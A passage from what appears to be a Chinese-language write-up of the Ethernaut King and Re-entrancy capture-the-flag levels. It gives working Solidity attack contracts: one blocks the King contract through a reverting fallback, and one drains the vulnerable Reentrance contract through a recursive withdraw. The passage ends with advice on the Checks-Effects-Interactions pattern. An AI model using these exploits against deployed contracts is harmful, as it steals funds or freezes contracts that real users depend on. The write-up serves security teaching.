<pre><code class='language-solidity' lang='solidity'>pragma solidity ^0.8.0;

contract Hack{
  constructor(address payable target)payable {
    uint prize = King(target).prize();
    (bool ok,) = target.call{value: prize}(&quot;&quot;);
    require(ok, &quot;call failed&quot;);
  }

  // fallback() external payable { 
  //   revert();
  // }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
</code></pre>
<p>&nbsp;</p>
<h3 id='sum-8'>Sum</h3>
<p>这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。</p>
<blockquote><p>大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).</p>
<p>关于这次的情况, 参见: <a href='https://www.kingoftheether.com/thrones/kingoftheether/index.html'>King of the Ether</a> 和 <a href='http://www.kingoftheether.com/postmortem.html'>King of the Ether Postmortem</a></p>
</blockquote>
<p>&nbsp;</p>
<h2 id='re-entrancy'>Re-entrancy</h2>
<h3 id='source-10'>Source</h3>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address =&gt; uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] &gt;= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;);
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
</code></pre>
<p>拿上面的代码简单解释一下重入漏洞，就是如果调用<code>withdraw</code>函数向一个合约转账，合约接收Ether会调用<code>receive</code>函数（或者<code>fallback</code>），那么只要在<code>receive</code>中再次调用<code>withdraw</code>，那么合约会再次进行转账并且不会执行到<code>msg.sender.call{value:_amount}(&quot;&quot;)</code>下方更改账户余额的语句<code>balances[msg.sender] -= _amount</code></p>
<p><img src="/wp-content/uploads/2024/03/1709725889-6.png" referrerpolicy="no-referrer" alt="img"></p>
<pre><code class='language-solidity' lang='solidity'>// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Ireentrancy {
  function donate(address) external payable ;
  function withdraw(uint256) external ;
}

contract Hack{
  Ireentrancy private immutable target;

  constructor(address _target){
    target = Ireentrancy(_target);
  }

  function attack() external  payable {
    target.donate{value: 1e18}(address(this));
    target.withdraw(1e18);

    require(address(target).balance == 0, &quot;target balance &gt; 0&quot;);
    selfdestruct(payable (msg.sender));
  }

  receive() external payable {
    uint amount = min(1e18, address(target).balance);
    if (amount &gt; 0){
      target.withdraw(amount);
    }
   }
  
  function min(uint x, uint y) private pure returns (uint){
    return x &lt;= y ? x : y;
  }
}
</code></pre>
<h3 id='sum-9'>Sum</h3>
<p>为了防止重入漏洞，最好采用<a href='https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern'>Checks-Effects-Interactions</a>模式，即先检查，然后更改合约状态变量，最后才与其他合约交互。</p>
</body>
</html>
